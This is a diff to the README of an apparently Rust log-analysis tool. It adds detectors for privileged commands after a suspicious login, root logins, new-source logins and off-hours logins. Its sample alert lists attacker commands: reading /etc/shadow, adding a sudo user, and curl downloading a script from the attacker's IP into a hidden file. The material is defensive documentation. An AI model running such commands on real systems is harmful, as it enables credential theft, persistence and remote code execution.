@@ -25,7 +25,10 @@ set of detection rules, and shows you only the **interesting** activity:
 
 - 🔴 **Brute force**: one IP hammering logins
 - 🔴 **Login after repeated failures**: a wall of failures, then a success. The one you really want to know about.
+- 🔴 **Privileged commands after a suspicious login**: that login, then `sudo cat /etc/shadow`
 - 🟡 **Username / password spray**: one IP, many accounts, a couple of tries each
+- 🟡 **Direct root login** and **login from a new source** for a known user
+- 🟢 **Off-hours login**: a quiet nudge, not an alarm
 
 Plus a **Top sources** table so you can see at a glance who is doing the
 knocking, optional **enrichment** (country, network owner, hostname) for
@@ -96,6 +99,18 @@ Interesting activity
    
    Recommendation:
    Investigate whether this source and login were expected.
+
+🔴 09:19:30 Privileged commands after suspicious login
+   User:       backup
+   Source:     45.20.13.8
+   Login:      09:18:47 (12 failures just before it)
+   Commands:
+     09:19:30  /usr/bin/cat /etc/shadow
+     09:20:02  /usr/sbin/useradd -m -G sudo support
+     09:20:40  /usr/bin/curl -s http://45.20.13.8/x.sh -o /tmp/.x
+   
+   Recommendation:
+   Treat this host as potentially compromised until the commands are explained.
 
 🟡 10:02:01 Possible username/password spray
    Source IP:         45.20.10.2
@@ -297,6 +312,20 @@ Each detector receives the same list of events and independently answers
    accounts with only a couple of tries each (default: 8+ users, ≤3 per user).
    This "low and slow" pattern is different from hammering a single account.
 
+4. **Privileged commands after suspicious login** — `sudo` lines carry no IP,
+   so this detector ties each command back to the user's most recent SSH
+   login. If that login followed a burst of failures (default: 5+ within the
+   window), the commands are listed and the finding is **High**.
+
+5. **Direct root login** — a successful SSH login as `root`. Either a policy
+   gap or exactly the account an attacker wants. **Medium**.
+
+6. **Login from a new source** — a user with an established source (2+
+   logins from one IP) logs in once from somewhere else. **Medium**.
+
+7. **Off-hours login** — a successful login between 23:00 and 06:00 by
+   default. Reported at **Normal** severity: not an alarm, just a glance.
+
 Findings are sorted most-severe first and rendered with a risk indicator:
 🔴 High, 🟡 Medium, 🟢 Normal.
 
@@ -380,7 +409,11 @@ src/
     ├── mod.rs                    Detection trait + registry
     ├── brute_force.rs            Detection #1
     ├── login_after_failures.rs   Detection #2 (correlation)
-    └── password_spray.rs         Detection #3
+    ├── password_spray.rs         Detection #3
+    ├── sudo_after_suspicious.rs  Detection #4 (correlation)
+    ├── root_login.rs             Detection #5
+    ├── new_source.rs             Detection #6
+    └── off_hours.rs              Detection #7
 ```
 
 The parsing and detection logic is pure (no I/O), so it is fully unit-testable
@@ -392,7 +425,8 @@ isolated in `source.rs`, `os_detect.rs`, `follow.rs`, and `enrich.rs`.
 1. Create `src/detections/your_rule.rs` implementing the `Detection` trait.
 2. Register it in `all_detectors()` in `src/detections/mod.rs`.
 
-That's the only wiring required.
+That's the only wiring required. See [CONTRIBUTING.md](CONTRIBUTING.md) for
+a walkthrough and ideas for detectors we would love to merge.
 
 ### Regenerating the demo GIF
 
